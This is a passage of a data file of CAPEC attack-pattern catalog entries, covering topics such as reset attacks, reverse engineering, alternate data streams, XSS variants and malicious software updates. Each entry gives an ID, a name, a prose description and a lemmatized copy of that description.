CAPEC-166,Force the System to Reset Values,"An attacker forces the target into a previous state in order to leverage potential weaknesses in the target dependent upon a prior configuration or state-dependent factors. Even in cases where an attacker may not be able to directly control the configuration of the targeted application, they may be able to reset the configuration to a prior state since many applications implement reset functions.Since these functions are usually intended as emergency features to return an application to a stable configuration if the current configuration degrades functionality, they may not be as strongly secured as other configuration options. The resetting of values is dangerous as it may enable undesired functionality, disable services, or modify access controls. At the very least this is a nuisance attack since the administrator will need to re-apply their configuration. At worst, this attack can open avenues for powerful attacks against the application, and, if it isn't obvious that the configuration has been reset, these vulnerabilities may be present a long time before they are notices.",attacker force target previous state order leverage potential weakness target dependent prior configuration state dependent factor case attacker able directly control configuration target application able reset configuration prior state application implement reset function function usually intend emergency feature return application stable configuration current configuration degrade functionality strongly secure configuration option resetting value dangerous enable undesired functionality disable service modify access control nuisance attack administrator need apply configuration bad attack open avenue powerful attack application obvious configuration reset vulnerability present long time notice
CAPEC-167,White Box Reverse Engineering,"An attacker discovers the structure, function, and composition of a type of computer software through white box analysis techniques. White box techniques involve methods which can be applied to a piece of software when an executable or some other compiled object can be directly subjected to analysis, revealing at least a portion of its machine instructions that can be observed upon execution.",attacker discover structure function composition type computer software white box analysis technique white box technique involve method apply piece software executable compile object directly subject analysis reveal portion machine instruction observe execution
CAPEC-168,Windows ::DATA Alternate Data Stream,"An attacker exploits the functionality of Microsoft NTFS Alternate Data Streams (ADS) to undermine system security. ADS allows multiple ""files"" to be stored in one directory entry referenced as filename:streamname. One or more alternate data streams may be stored in any file or directory. Normal Microsoft utilities do not show the presence of an ADS stream attached to a file. The additional space for the ADS is not recorded in the displayed file size. The additional space for ADS is accounted for in the used space on the volume. An ADS can be any type of file. ADS are copied by standard Microsoft utilities between NTFS volumes. ADS can be used by an attacker or intruder to hide tools, scripts, and data from detection by normal system utilities. Many anti-virus programs do not check for or scan ADS. Windows Vista does have a switch (-R) on the command line DIR command that will display alternate streams.",attacker exploit functionality microsoft ntfs alternate data streams ads undermine system security ads allow multiple file store directory entry reference filename streamname alternate data stream store file directory normal microsoft utility presence ads stream attach file additional space ads record display file size additional space ads account space volume ads type file ads copy standard microsoft utility ntfs volume ads attacker intruder hide tool script datum detection normal system utility anti virus program check scan ads windows vista switch command line dir command display alternate stream
CAPEC-169,Footprinting,"An adversary engages in probing and exploration activities to identify constituents and properties of the target.Footprinting is a general term to describe a variety of information gathering techniques, often used by attackers in preparation for some attack. It consists of using tools to learn as much as possible about the composition, configuration, and security mechanisms of the targeted application, system or network. Information that might be collected during a footprinting effort could include open ports, applications and their versions, network topology, and similar information. Although similar to fingerprinting, footprinting aims to get a more holistic view of a system or network, whereas fingerprinting is more targeted to a specific application or operating system. While footprinting is not intended to be damaging (although certain activities, such as network scans, can sometimes cause disruptions to vulnerable applications inadvertently) it may often pave the way for more damaging attacks.",adversary engage probing exploration activity identify constituent property target footprinting general term describe variety information gathering technique attacker preparation attack consist tool learn possible composition configuration security mechanism target application system network information collect footprinting effort include open port application version network topology similar information similar fingerprinting footprinting aim holistic view system network fingerprinting target specific application operate system footprinting intend damage certain activity network scan cause disruption vulnerable application inadvertently pave way damaging attack
CAPEC-17,Using Malicious Files,"An attack of this type exploits a system's configuration that allows an adversary to either directly access an executable file, for example through shell access; or in a possible worst case allows an adversary to upload a file and then execute it. Web servers, ftp servers, and message oriented middleware systems which have many integration points are particularly vulnerable, because both the programmers and the administrators must be in synch regarding the interfaces and the correct privileges for each interface.",attack type exploit system configuration allow adversary directly access executable file example shell access possible bad case allow adversary upload file execute web server ftp server message orient middleware system integration point particularly vulnerable programmer administrator synch interface correct privilege interface
CAPEC-170,Web Application Fingerprinting,"An attacker sends a series of probes to a web application in order to elicit version-dependent and type-dependent behavior that assists in identifying the target. An attacker could learn information such as software versions, error pages, and response headers, variations in implementations of the HTTP protocol, directory structures, and other similar information about the targeted service. This information can then be used by an attacker to formulate a targeted attack plan. While web application fingerprinting is not intended to be damaging (although certain activities, such as network scans, can sometimes cause disruptions to vulnerable applications inadvertently) it may often pave the way for more damaging attacks.",attacker send series probe web application order elicit version dependent type dependent behavior assist identify target attacker learn information software version error page response header variation implementation http protocol directory structure similar information target service information attacker formulate target attack plan web application fingerprinting intend damaging certain activity network scan cause disruption vulnerable application inadvertently pave way damaging attack
CAPEC-173,Action Spoofing,"An adversary is able to disguise one action for another and therefore trick a user into initiating one type of action when they intend to initiate a different action. For example, a user might be led to believe that clicking a button will submit a query, but in fact it downloads software. Adversaries may perform this attack through social means, such as by simply convincing a victim to perform the action or relying on a user's natural inclination to do so, or through technical means, such as a clickjacking attack where a user sees one interface but is actually interacting with a second, invisible, interface.",adversary able disguise action trick user initiate type action intend initiate different action example user lead believe click button submit query fact download software adversary perform attack social mean simply convince victim perform action rely user natural inclination technical mean clickjacking attack user see interface actually interact second invisible interface
CAPEC-174,Flash Parameter Injection,"An adversary takes advantage of improper data validation to inject malicious global parameters into a Flash file embedded within an HTML document. Flash files can leverage user-submitted data to configure the Flash document and access the embedding HTML document.These 'FlashVars' are most often passed to the Flash file via URL arguments or from the Object or Embed tag within the embedding HTML document. If these FlashVars are not properly sanitized, an adversary may be able to embed malicious content (such as scripts) into the HTML document.The injected parameters can also provide the adversary control over other objects within the Flash file as well as full control over the parent document's DOM model. As such, this is a form of HTTP parameter injection, but the abilities granted to the Flash document (such as access to a page's document model, including associated cookies) make this attack more flexible. Flash Parameter Injection attacks can also preface further attacks such as various forms of Cross-Site Scripting (XSS) attacks in addition to Session Hijacking attacks.",adversary take advantage improper datum validation inject malicious global parameter flash file embed html document flash file leverage user submit datum configure flash document access embed html document flashvar pass flash file url argument object embed tag embed html document flashvars properly sanitize adversary able embed malicious content script html document inject parameter provide adversary control object flash file control parent document dom model form http parameter injection ability grant flash document access page document model include associate cookie attack flexible flash parameter injection attack preface attack form cross site scripting xss attack addition session hijacking attack
CAPEC-175,Code Inclusion,"An adversary exploits a weakness on the target to force arbitrary code to be retrieved locally or from a remote location and executed. This differs from code injection in that code injection involves the direct inclusion of code while code inclusion involves the addition or replacement of a reference to a code file, which is subsequently loaded by the target and used as part of the code of some application.",adversary exploit weakness target force arbitrary code retrieve locally remote location execute differ code injection code injection involve direct inclusion code code inclusion involve addition replacement reference code file subsequently load target code application
CAPEC-176,Configuration/Environment Manipulation,"An attacker manipulates files or settings external to a target application which affect the behavior of that application. For example, many applications use external configuration files and libraries - modification of these entities or otherwise affecting the application's ability to use them would constitute a configuration/environment manipulation attack.",attacker manipulate file setting external target application affect behavior application example application use external configuration file library modification entity affect application ability use constitute configuration environment manipulation attack
CAPEC-177,Create files with the same name as files protected with a higher classification,"An attacker exploits file location algorithms in an operating system or application by creating a file with the same name as a protected or privileged file. The attacker could manipulate the system if the attacker-created file is trusted by the operating system or an application component that attempts to load the original file. Applications often load or include external files, such as libraries or configuration files. These files should be protected against malicious manipulation. However, if the application only uses the name of the file when locating it, an attacker may be able to create a file with the same name and place it in a directory that the application will search before the directory with the legitimate file is searched. Because the attackers' file is discovered first, it would be used by the target application. This attack can be extremely destructive if the referenced file is executable and/or is granted special privileges based solely on having a particular name.",attacker exploit file location algorithm operate system application create file protected privileged file attacker manipulate system attacker create file trust operate system application component attempt load original file application load include external file library configuration file file protect malicious manipulation application use file locate attacker able create file place directory application search directory legitimate file search attacker file discover target application attack extremely destructive reference file executable grant special privilege base solely have particular
CAPEC-178,Cross-Site Flashing,"An attacker is able to trick the victim into executing a Flash document that passes commands or calls to a Flash player browser plugin, allowing the attacker to exploit native Flash functionality in the client browser. This attack pattern occurs where an attacker can provide a crafted link to a Flash document (SWF file) which, when followed, will cause additional malicious instructions to be executed. The attacker does not need to serve or control the Flash document. The attack takes advantage of the fact that Flash files can reference external URLs. If variables that serve as URLs that the Flash application references can be controlled through parameters, then by creating a link that includes values for those parameters, an attacker can cause arbitrary content to be referenced and possibly executed by the targeted Flash application.",attacker able trick victim execute flash document pass command call flash player browser plugin allow attacker exploit native flash functionality client browser attack pattern occur attacker provide craft link flash document swf file follow cause additional malicious instruction execute attacker need serve control flash document attack take advantage fact flash file reference external url variable serve url flash application reference control parameter create link include value parameter attacker cause arbitrary content reference possibly execute target flash application
CAPEC-179,Calling Micro-Services Directly,"An attacker is able to discover and query Micro-services at a web location and thereby expose the Micro-services to further exploitation by gathering information about their implementation and function. Micro-services in web pages allow portions of a page to connect to the server and update content without needing to cause the entire page to update. This allows user activity to change portions of the page more quickly without causing disruptions elsewhere.However, these micro-services may not be subject to the same level of security review as other forms of content. For example, a micro-service that posts requests to a server that are turned into SQL queries may not adequately protect against SQL-injection attacks. As a result, micro-services may provide another vector for a range of attacks. It should be emphasized that the presence of micro-services does not necessarily make a site vulnerable to attack, but they do provide additional complexity to a web page and therefore may contain vulnerabilities that support other attack patterns.",attacker able discover query micro service web location expose micro service exploitation gather information implementation function micro service web page allow portion page connect server update content need cause entire page update allow user activity change portion page quickly cause disruption micro service subject level security review form content example micro service post request server turn sql query adequately protect sql injection attack result micro service provide vector range attack emphasize presence micro service necessarily site vulnerable attack provide additional complexity web page contain vulnerability support attack pattern
CAPEC-18,XSS Targeting Non-Script Elements,"This attack is a form of Cross-Site Scripting (XSS) where malicious scripts are embedded in elements that are not expected to host scripts such as image tags (<img>), comments in XML documents (< !-CDATA->), etc. These tags may not be subject to the same input validation, output validation, and other content filtering and checking routines, so this can create an opportunity for an adversary to tunnel through the application's elements and launch a XSS attack through other elements. As with all remote attacks, it is important to differentiate the ability to launch an attack (such as probing an internal network for unpatched servers) and the ability of the remote adversary to collect and interpret the output of said attack.",attack form cross site scripting xss malicious script embed element expect host script image tag img comment xml document etc tag subject input validation output validation content filtering checking routine create opportunity adversary tunnel application element launch xss attack element remote attack important differentiate ability launch attack probe internal network unpatched server ability remote adversary collect interpret output say attack
CAPEC-180,Exploiting Incorrectly Configured Access Control Security Levels,"An attacker exploits a weakness in the configuration of access controls and is able to bypass the intended protection that these measures guard against and thereby obtain unauthorized access to the system or network. Sensitive functionality should always be protected with access controls. However configuring all but the most trivial access control systems can be very complicated and there are many opportunities for mistakes. If an attacker can learn of incorrectly configured access security settings, they may be able to exploit this in an attack.Most commonly, attackers would take advantage of controls that provided too little protection for sensitive activities in order to perform actions that should be denied to them. In some circumstances, an attacker may be able to take advantage of overly restrictive access control policies, initiating denial of services (if an application locks because it unexpectedly failed to be granted access) or causing other legitimate actions to fail due to security. The latter class of attacks, however, is usually less severe and easier to detect than attacks based on inadequate security restrictions. This attack pattern differs from CAPEC 1, ""Accessing Functionality Not Properly Constrained by ACLs"" in that the latter describes attacks where sensitive functionality lacks access controls, where, in this pattern, the access control is present, but incorrectly configured.",attacker exploit weakness configuration access control able bypass intended protection measure guard obtain unauthorized access system network sensitive functionality protect access control configure trivial access control system complicated opportunity mistake attacker learn incorrectly configure access security setting able exploit attack commonly attacker advantage control provide little protection sensitive activity order perform action deny circumstance attacker able advantage overly restrictive access control policy initiate denial service application lock unexpectedly fail grant access cause legitimate action fail security class attack usually severe easy detect attack base inadequate security restriction attack pattern differ capec accessing functionality properly constrain acls describe attack sensitive functionality lack access control pattern access control present incorrectly configure
CAPEC-181,Flash File Overlay,"An attacker creates a transparent overlay using flash in order to intercept user actions for the purpose of performing a clickjacking attack. In this technique, the Flash file provides a transparent overlay over HTML content. Because the Flash application is on top of the content, user actions, such as clicks, are caught by the Flash application rather than the underlying HTML. The action is then interpreted by the overlay to perform the actions the attacker wishes.",attacker create transparent overlay flash order intercept user action purpose perform clickjacking attack technique flash file provide transparent overlay html content flash application content user action click catch flash application underlie html action interpret overlay perform action attacker wish
CAPEC-182,Flash Injection,"An attacker tricks a victim to execute malicious flash content that executes commands or makes flash calls specified by the attacker. One example of this attack is cross-site flashing, an attacker controlled parameter to a reference call loads from content specified by the attacker.",attacker trick victim execute malicious flash content execute command make flash call specify attacker example attack cross site flashing attacker control parameter reference load content specify attacker
CAPEC-183,IMAP/SMTP Command Injection,"An adversary exploits weaknesses in input validation on web-mail servers to execute commands on the IMAP/SMTP server. Web-mail servers often sit between the Internet and the IMAP or SMTP mail server. User requests are received by the web-mail servers which then query the back-end mail server for the requested information and return this response to the user. In an IMAP/SMTP command injection attack, mail-server commands are embedded in parts of the request sent to the web-mail server. If the web-mail server fails to adequately sanitize these requests, these commands are then sent to the back-end mail server when it is queried by the web-mail server, where the commands are then executed. This attack can be especially dangerous since administrators may assume that the back-end server is protected against direct Internet access and therefore may not secure it adequately against the execution of malicious commands.",adversary exploit weakness input validation web mail server execute command imap smtp server web mail server sit internet imap smtp mail server user request receive web mail server query end mail server request information return response user imap smtp command injection attack mail server command embed part request send web mail server web mail server fail adequately sanitize request command send end mail server query web mail server command execute attack especially dangerous administrator assume end server protect direct internet access secure adequately execution malicious command
CAPEC-184,Software Integrity Attack,"An attacker initiates a series of events designed to cause a user, program, server, or device to perform actions which undermine the integrity of software code, device data structures, or device firmware, achieving the modification of the target's integrity to achieve an insecure state.",attacker initiate series event design cause user program server device perform action undermine integrity software code device data structure device firmware achieve modification target integrity achieve insecure state
CAPEC-185,Malicious Software Download,An attacker uses deceptive methods to cause a user or an automated process to download and install dangerous code that originates from an attacker controlled source. There are several variations to this strategy of attack.,attacker use deceptive method cause user automated process download install dangerous code originate attacker control source variation strategy attack
CAPEC-186,Malicious Software Update,"An adversary uses deceptive methods to cause a user or an automated process to download and install dangerous code believed to be a valid update that originates from an adversary controlled source.Although there are several variations to this strategy of attack, the attack methods are united in that all rely on the ability of an adversary to position and disguise malicious content such that it masquerades as a legitimate software update which is then processed by a program, undermining application integrity.As such the attack employs 'spoofing' techniques augmented by psychological or technological mechanisms to disguise the update and/or its source. Virtually all software requires frequent updates or patches, giving the adversary immense latitude when structuring the attack, as well as many targets of opportunity. Automated attacks involving malicious software updates require little to no user-directed activity and are therefore advantageous because they avoid the complex preliminary setup stages of manual attacks, which must effectively 'hook' users while avoiding countermeasures such as spam filters or web security filters.",adversary use deceptive method cause user automated process download install dangerous code believe valid update originate adversary control source variation strategy attack attack method unite rely ability adversary position disguise malicious content masquerade legitimate software update process program undermine application integrity attack employ spoofing technique augment psychological technological mechanism disguise update source virtually software require frequent update patch give adversary immense latitude structure attack target opportunity automated attack involve malicious software update require little user direct activity advantageous avoid complex preliminary setup stage manual attack effectively hook user avoid countermeasure spam filter web security filter
CAPEC-187,Malicious Automated Software Update via Redirection,"An attacker exploits two layers of weaknesses in server or client software for automated update mechanisms to undermine the integrity of the target code-base. The first weakness involves a failure to properly authenticate a server as a source of update or patch content. This type of weakness typically results from authentication mechanisms which can be defeated, allowing a hostile server to satisfy the criteria that establish a trust relationship. The second weakness is a systemic failure to validate the identity and integrity of code downloaded from a remote location, hence the inability to distinguish malicious code from a legitimate update.One predominate type of redirection attack requires DNS spoofing or hijacking of a domain name corresponding to an update server. The target software initiates an update request and the DNS request resolves the domain name of the update server to the IP address of the attacker, at which point the software accepts updates either transmitted by or pulled from the attackers' server. Attacks against DNS mechanisms comprise an initial phase of a chain of attacks that facilitate automated update hijacking attack, and such attacks have a precedent in targeted activities that have been as complex as DNS/BIND attacks of corporate infrastructures, to untargeted attacks aimed at compromising home broadband routers, as well as attacks involving the compromise of wireless access points, as well as 'evil twin' attacks coupled with DNS redirection. Due to the plethora of options open to the attacker in forcing name resolution to arbitrary servers the Automated Update Hijacking attack strategies are the tip of the spear for many multi-stage attack chains.The second weakness that is exploited by the attacker is the lack of integrity checking by the software in validating the update. Software which relies only upon domain name resolution to establish the identity of update code is particularly vulnerable, because this signals an absence of other security countermeasures that could be applied to invalidate the attackers' payload on basis of code identity, hashing, signing, encryption, and other integrity checking mechanisms. Redirection-based attack patterns work equally well against client-side software as well as local servers or daemons that provide software update functionality.",attacker exploit layer weakness server client software automate update mechanism undermine integrity target code base weakness involve failure properly authenticate server source update patch content type weakness typically result authentication mechanism defeat allow hostile server satisfy criterion establish trust relationship second weakness systemic failure validate identity integrity code download remote location inability distinguish malicious code legitimate update predominate type redirection attack require dns spoofing hijacking domain correspond update server target software initiate update request dns request resolve domain update server ip address attacker point software accept update transmit pull attacker server attack dns mechanism comprise initial phase chain attack facilitate automate update hijacking attack attack precedent target activity complex dns bind attack corporate infrastructure untargeted attack aim compromise home broadband router attack involve compromise wireless access point evil twin attack couple dns redirection plethora option open attacker force resolution arbitrary server automated update hijacking attack strategy tip spear multi stage attack chain second weakness exploit attacker lack integrity checking software validate update software rely domain resolution establish identity update code particularly vulnerable signal absence security countermeasure apply invalidate attacker payload basis code identity hashing signing encryption integrity checking mechanism redirection base attack pattern work equally client software local server daemon provide software update functionality
CAPEC-188,Reverse Engineering,"An adversary discovers the structure, function, and composition of an object, resource, or system by using a variety of analysis techniques to effectively determine how the analyzed entity was constructed or operates. The goal of reverse engineering is often to duplicate the function, or a part of the function, of an object in order to duplicate or ""back engineer"" some aspect of its functioning. Reverse engineering techniques can be applied to mechanical objects, electronic devices, or software, although the methodology and techniques involved in each type of analysis differ widely.",adversary discover structure function composition object resource system variety analysis technique effectively determine analyze entity construct operate goal reverse engineering duplicate function function object order duplicate engineer aspect functioning reverse engineering technique apply mechanical object electronic device software methodology technique involve type analysis differ widely
CAPEC-189,Black Box Reverse Engineering,"An adversary discovers the structure, function, and composition of a type of computer software through black box analysis techniques. 'Black Box' methods involve interacting with the software indirectly, in the absence of direct access to the executable object. Such analysis typically involves interacting with the software at the boundaries of where the software interfaces with a larger execution environment, such as input-output vectors, libraries, or APIs. Black Box Reverse Engineering also refers to gathering physical side effects of a hardware device, such as electromagnetic radiation or sounds.",adversary discover structure function composition type computer software black box analysis technique black box method involve interact software indirectly absence direct access executable object analysis typically involve interact software boundary software interface large execution environment input output vector library api black box reverse engineering refer gather physical effect hardware device electromagnetic radiation sound
CAPEC-19,Embedding Scripts within Scripts,"An adversary leverages the capability to execute their own script by embedding it within other scripts that the target software is likely to execute due to programs' vulnerabilities that are brought on by allowing remote hosts to execute scripts.The adversary must have the ability to inject their script into a script that is likely to be executed. If this is done, then the adversary can potentially launch a variety of probes and attacks against the web server's local environment, in many cases the so-called DMZ, back end resources the web server can communicate with, and other hosts. With the proliferation of intermediaries, such as Web App Firewalls, network devices, and even printers having JVMs and Web servers, there are many locales where an adversary can inject malicious scripts. Since this attack pattern defines scripts within scripts, there are likely privileges to execute said attack on the host. These attacks are not solely limited to the server side, client side scripts like Ajax and client side JavaScript can contain malicious scripts as well.",adversary leverage capability execute script embed script target software likely execute program vulnerability bring allow remote host execute script adversary ability inject script script likely execute adversary potentially launch variety probe attack web server local environment case call dmz end resource web server communicate host proliferation intermediary web app firewall network device printer have jvm web server locale adversary inject malicious script attack pattern define script script likely privilege execute say attack host attack solely limit server client script like ajax client javascript contain malicious script
CAPEC-190,Reverse Engineer an Executable to Expose Assumed Hidden Functionality,"An attacker analyzes a binary file or executable for the purpose of discovering the structure, function, and possibly source-code of the file by using a variety of analysis techniques to effectively determine how the software functions and operates. This type of analysis is also referred to as Reverse Code Engineering, as techniques exist for extracting source code from an executable. Several techniques are often employed for this purpose, both black box and white box. The use of computer bus analyzers and packet sniffers allows the binary to be studied at a level of interactions with its computing environment, such as a host OS, inter-process communication, and/or network communication. This type of analysis falls into the 'black box' category because it involves behavioral analysis of the software without reference to source code, object code, or protocol specifications.",attacker analyze binary file executable purpose discover structure function possibly source code file variety analysis technique effectively determine software function operate type analysis refer reverse code engineering technique exist extract source code executable technique employ purpose black box white box use computer bus analyzer packet sniffer allow binary study level interaction computing environment host os inter process communication network communication type analysis fall black box category involve behavioral analysis software reference source code object code protocol specification
CAPEC-191,Read Sensitive Constants Within an Executable,"An adversary engages in activities to discover any sensitive constants present within the compiled code of an executable. These constants may include literal ASCII strings within the file itself, or possibly strings hard-coded into particular routines that can be revealed by code refactoring methods including static and dynamic analysis.One specific example of a sensitive string is a hard-coded password. Typical examples of software with hard-coded passwords include server-side executables which may check for a hard-coded password or key during a user's authentication with the server. Hard-coded passwords can also be present in client-side executables which utilize the password or key when connecting to either a remote component, such as a database server, licensing server, or otherwise, or a processes on the same host that expects a key or password. When analyzing an executable the adversary may search for the presence of such strings by analyzing the byte-code of the file itself. Example utilities for revealing strings within a file include 'strings,' 'grep,' or other variants of these programs depending upon the type of operating system used. These programs can be used to dump any ASCII or UNICODE strings contained within a program. Strings can also be searched for using a hex editors by loading the binary or object code file and utilizing native search functions such as regular expressions.Additionally, sensitive numeric values can occur within an executable. This can be used to discover the location of cryptographic constants.",adversary engage activity discover sensitive constant present compile code executable constant include literal ascii string file possibly string hard code particular routine reveal code refactoring method include static dynamic analysis specific example sensitive string hard code password typical example software hard code password include server executable check hard code password key user authentication server hard code password present client executable utilize password key connect remote component database server licensing server process host expect key password analyze executable adversary search presence string analyze byte code file example utility reveal string file include string grep variant program depend type operating system program dump ascii unicode string contain program string search hex editor load binary object code file utilize native search function regular expression additionally sensitive numeric value occur executable discover location cryptographic constant
CAPEC-192,Protocol Analysis,"An adversary engages in activities to decipher and/or decode protocol information for a network or application communication protocol used for transmitting information between interconnected nodes or systems on a packet-switched data network. While this type of analysis involves the analysis of a networking protocol inherently, it does not require the presence of an actual or physical network.Although certain techniques for protocol analysis benefit from manipulating live 'on-the-wire' interactions between communicating components, static or dynamic analysis techniques applied to executables as well as to device drivers, such as network interface drivers, can also be used to reveal the function and characteristics of a communication protocol implementation. Depending upon the methods used the process may involve observing, interacting, and modifying actual communications occurring between hosts. The goal of protocol analysis is to derive the data transmission syntax, as well as to extract the meaningful content, including packet or content delimiters used by the protocol. This type of analysis is often performed on closed-specification protocols, or proprietary protocols, but is also useful for analyzing publicly available specifications to determine how particular implementations deviate from published specifications.",adversary engage activity decipher decode protocol information network application communication protocol transmit information interconnected node system packet switch data network type analysis involve analysis networking protocol inherently require presence actual physical network certain technique protocol analysis benefit manipulate live wire interaction communicate component static dynamic analysis technique apply executable device driver network interface driver reveal function characteristic communication protocol implementation depend method process involve observe interact modify actual communication occur host goal protocol analysis derive data transmission syntax extract meaningful content include packet content delimiter protocol type analysis perform closed specification protocol proprietary protocol useful analyze publicly available specification determine particular implementation deviate publish specification
CAPEC-193,PHP Remote File Inclusion,"In this pattern the adversary is able to load and execute arbitrary code remotely available from the application. This is usually accomplished through an insecurely configured PHP runtime environment and an improperly sanitized ""include"" or ""require"" call, which the user can then control to point to any web-accessible file. This allows adversaries to hijack the targeted application and force it to execute their own instructions.",pattern adversary able load execute arbitrary code remotely available application usually accomplish insecurely configure php runtime environment improperly sanitize include require user control point web accessible file allow adversary hijack target application force execute instruction
CAPEC-194,Fake the Source of Data,"An adversary takes advantage of improper authentication to provide data or services under a falsified identity. The purpose of using the falsified identity may be to prevent traceability of the provided data or to assume the rights granted to another individual. One of the simplest forms of this attack would be the creation of an email message with a modified ""From"" field in order to appear that the message was sent from someone other than the actual sender. The root of the attack (in this case the email system) fails to properly authenticate the source and this results in the reader incorrectly performing the instructed action. Results of the attack vary depending on the details of the attack, but common results include privilege escalation, obfuscation of other attacks, and data corruption/manipulation.",adversary take advantage improper authentication provide datum service falsified identity purpose falsified identity prevent traceability provide datum assume right grant individual simple form attack creation email message modify field order appear message send actual sender root attack case email system fail properly authenticate source result reader incorrectly perform instruct action result attack vary depend detail attack common result include privilege escalation obfuscation attack data corruption manipulation
CAPEC-195,Principal Spoof,"A Principal Spoof is a form of Identity Spoofing where an adversary pretends to be some other person in an interaction. This is often accomplished by crafting a message (either written, verbal, or visual) that appears to come from a person other than the adversary. Phishing and Pharming attacks often attempt to do this so that their attempts to gather sensitive information appear to come from a legitimate source. A Principal Spoof does not use stolen or spoofed authentication credentials, instead relying on the appearance and content of the message to reflect identity.The possible outcomes of a Principal Spoof mirror those of Identity Spoofing. (e.g., escalation of privilege and false attribution of data or activities) Likewise, most techniques for Identity Spoofing (crafting messages or intercepting and replaying or modifying messages) can be used for a Principal Spoof attack. However, because a Principal Spoof is used to impersonate a person, social engineering can be both an attack technique (using social techniques to generate evidence in support of a false identity) as well as a possible outcome (manipulating people's perceptions by making statements or performing actions under a target's name).",principal spoof form identity spoofing adversary pretend person interaction accomplish craft message write verbal visual appear come person adversary phishing pharming attack attempt attempt gather sensitive information appear come legitimate source principal spoof use steal spoofed authentication credential instead rely appearance content message reflect identity possible outcome principal spoof mirror identity spoofing escalation privilege false attribution datum activity likewise technique identity spoofing craft message intercept replay modify message principal spoof attack principal spoof impersonate person social engineering attack technique social technique generate evidence support false identity possible outcome manipulate people perception make statement perform action target
CAPEC-196,Session Credential Falsification through Forging,"An attacker creates a false but functional session credential in order to gain or usurp access to a service. Session credentials allow users to identify themselves to a service after an initial authentication without needing to resend the authentication information (usually a username and password) with every message. If an attacker is able to forge valid session credentials they may be able to bypass authentication or piggy-back off some other authenticated user's session. This attack differs from Reuse of Session IDs and Session Sidejacking attacks in that in the latter attacks an attacker uses a previous or existing credential without modification while, in a forging attack, the attacker must create their own credential, although it may be based on previously observed credentials.",attacker create false functional session credential order gain usurp access service session credential allow user identify service initial authentication need resend authentication information usually username password message attacker able forge valid session credential able bypass authentication piggy authenticate user session attack differ reuse session id session sidejacking attack attack attacker use previous existing credential modification forging attack attacker create credential base previously observed credential
CAPEC-197,Exponential Data Expansion,"An adversary submits data to a target application which contains nested exponential data expansion to produce excessively large output. Many data format languages allow the definition of macro-like structures that can be used to simplify the creation of complex structures. However, this capability can be abused to create excessive demands on a processor's CPU and memory. A small number of nested expansions can result in an exponential growth in demands on memory.",adversary submit datum target application contain nest exponential datum expansion produce excessively large output data format language allow definition macro like structure simplify creation complex structure capability abuse create excessive demand processor cpu memory small number nest expansion result exponential growth demand memory
CAPEC-198,XSS Targeting Error Pages,"An adversary distributes a link (or possibly some other query structure) with a request to a third party web server that is malformed and also contains a block of exploit code in order to have the exploit become live code in the resulting error page.When the third party web server receives the crafted request and notes the error it then creates an error message that echoes the malformed message, including the exploit. Doing this converts the exploit portion of the message into to valid language elements that are executed by the viewing browser. When a victim executes the query provided by the adversary the infected error message is returned including the exploit code which then runs in the victim's browser. XSS can result in execution of code as well as data leakage (e.g. session cookies can be sent to the attacker). This type of attack is especially dangerous since the exploit appears to come from the third party web server, who the victim may trust and hence be more vulnerable to deception.",adversary distribute link possibly query structure request party web server malforme contain block exploit code order exploit live code result error page party web server receive craft request note error create error message echo malformed message include exploit convert exploit portion message valid language element execute view browser victim execute query provide adversary infected error message return include exploit code run victim browser xss result execution code datum leakage session cookie send attacker type attack especially dangerous exploit appear come party web server victim trust vulnerable deception
CAPEC-199,XSS Using Alternate Syntax,"An adversary uses alternate forms of keywords or commands that result in the same action as the primary form but which may not be caught by filters. For example, many keywords are processed in a case insensitive manner. If the site's web filtering algorithm does not convert all tags into a consistent case before the comparison with forbidden keywords it is possible to bypass filters (e.g., incomplete black lists) by using an alternate case structure. For example, the ""script"" tag using the alternate forms of ""Script"" or ""ScRiPt"" may bypass filters where ""script"" is the only form tested. Other variants using different syntax representations are also possible as well as using pollution meta-characters or entities that are eventually ignored by the rendering engine. The attack can result in the execution of otherwise prohibited functionality.",adversary use alternate form keyword command result action primary form catch filter example keyword process case insensitive manner site web filtering algorithm convert tag consistent case comparison forbid keyword possible bypass filter incomplete black list alternate case structure example script tag alternate form script script bypass filter script form test variant different syntax representation possible pollution meta character entity eventually ignore render engine attack result execution prohibit functionality
CAPEC-2,Inducing Account Lockout,"An attacker leverages the security functionality of the system aimed at thwarting potential attacks to launch a denial of service attack against a legitimate system user. Many systems, for instance, implement a password throttling mechanism that locks an account after a certain number of incorrect log in attempts. An attacker can leverage this throttling mechanism to lock a legitimate user out of their own account. The weakness that is being leveraged by an attacker is the very security feature that has been put in place to counteract attacks.",attacker leverage security functionality system aim thwart potential attack launch denial service attack legitimate system user system instance implement password throttling mechanism lock account certain number incorrect log attempt attacker leverage throttling mechanism lock legitimate user account weakness leverage attacker security feature place counteract attack
CAPEC-20,Encryption Brute Forcing,"An attacker, armed with the cipher text and the encryption algorithm used, performs an exhaustive (brute force) search on the key space to determine the key that decrypts the cipher text to obtain the plaintext.",attacker arm cipher text encryption algorithm perform exhaustive brute force search key space determine key decrypt cipher text obtain plaintext
CAPEC-200,"Removal of filters: Input filters, output filters, data masking","An attacker removes or disables filtering mechanisms on the target application. Input filters prevent invalid data from being sent to an application (for example, overly large inputs that might cause a buffer overflow or other malformed inputs that may not be correctly handled by an application). Input filters might also be designed to constrained executable content.For example, if an application accepts scripting languages as input, an input filter could constrain the commands received and block those that the application's administrator deems to be overly powerful. An output filter screens responses from an application or person in order to prevent disclosure of sensitive information.For example, an application's output filter might block output that is sourced to sensitive folders or which contains certain keywords. A data mask is similar to an output filter, but usually applies to structured data, such as found in databases. Data masks elide or replace portions of the information returned from a query in order to protect against the disclosure of sensitive information. If an input filter is removed the attacker will be able to send content to the target and have the target utilize it without it being sanitized. If the content sent by the attacker is executable, the attacker may be able to execute arbitrary commands on the target. If an output filter or data masking mechanism is disabled, the target may send out sensitive information that would otherwise be elided by the filters. If the data mask is disabled, sensitive information stored in a database would be returned unaltered. This could result in the disclosure of sensitive information, such as social security numbers of payment records.This attack is usually executed as part of a larger attack series. The attacker would disable filters and would then mount additional attacks to either insert commands or data or query the target application in ways that would otherwise be prevented by the filters.",attacker remove disable filter mechanism target application input filter prevent invalid datum send application example overly large input cause buffer overflow malformed input correctly handle application input filter design constrained executable content example application accept script language input input filter constrain command receive block application administrator deem overly powerful output filter screen response application person order prevent disclosure sensitive information example application output filter block output source sensitive folder contain certain keyword data mask similar output filter usually apply structured datum find database datum mask elide replace portion information return query order protect disclosure sensitive information input filter remove attacker able send content target target utilize sanitize content send attacker executable attacker able execute arbitrary command target output filter datum masking mechanism disable target send sensitive information elide filter datum mask disable sensitive information store database return unaltered result disclosure sensitive information social security number payment record attack usually execute large attack series attacker disable filter 